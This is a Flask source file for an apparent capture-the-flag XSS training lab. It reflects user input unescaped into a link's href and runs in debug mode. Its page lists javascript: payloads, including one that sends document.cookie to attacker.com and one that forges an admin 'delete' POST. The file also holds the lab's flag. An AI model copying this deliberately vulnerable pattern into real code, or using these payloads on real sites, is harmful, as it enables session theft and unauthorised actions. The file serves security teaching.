"""
XSS Lab 7: JavaScript Protocol Handler
Difficulty: 2 (Intermediate)
Type: Reflected XSS via JavaScript Protocol
Points: 75

Description:
XSS using javascript: protocol in href attributes.
Allows executing JavaScript when user clicks a link.
"""

from flask import Flask, request

app = Flask(__name__)

@app.route('/')
def index():
    return """
    <html>
        <head>
            <title>XSS Lab 7: JavaScript Protocol</title>
            <style>
                body { font-family: Arial; margin: 40px; max-width: 600px; }
                .form-group { margin: 15px 0; }
                input { padding: 8px; width: 300px; }
                button { padding: 8px 15px; background: #007bff; color: white; border: none; cursor: pointer; }
            </style>
        </head>
        <body>
            <h1>Lab 7: JavaScript Protocol Handler</h1>
            <p>This lab has vulnerable link generation using user input.</p>
            
            <div class="form-group">
                <form action="/link" method="GET">
                    <input type="text" name="url" placeholder="Enter URL" value="http://example.com">
                    <button type="submit">Generate Link</button>
                </form>
            </div>
            
            <p><strong>Flag:</strong> FLAG{xss_js_protocol_007}</p>
        </body>
    </html>
    """

@app.route('/link', methods=['GET'])
def link():
    """Generate link with user input"""
    url = request.args.get('url', 'http://example.com')
    
    # VULNERABLE: User input directly in href
    html = f"""
    <html>
        <head>
            <title>Link Preview</title>
            <style>
                body {{ font-family: Arial; margin: 40px; }}
                a {{ padding: 10px; background: #007bff; color: white; text-decoration: none; border-radius: 3px; }}
            </style>
        </head>
        <body>
            <h1>Generated Link</h1>
            
            <!-- VULNERABLE: javascript: protocol not filtered -->
            <a href="{url}">Click here to continue</a>
            
            <h3>Payload Examples:</h3>
            <ul>
                <li><code>javascript:alert('XSS')</code></li>
                <li><code>javascript:fetch('http://attacker.com/steal?data='+document.cookie)</code></li>
                <li><code>javascript:void(fetch('/api/admin',{{method:'POST',body:JSON.stringify({{action:'delete'}})}}));return false;</code></li>
                <li><code>data:text/html,&lt;script&gt;alert('XSS')&lt;/script&gt;</code></li>
                <li><code>vbscript:alert('XSS')</code></li>
            </ul>
            
            <p><a href="/">Back</a></p>
        </body>
    </html>
    """
    
    return html

if __name__ == '__main__':
    app.run(debug=True, port=5007)
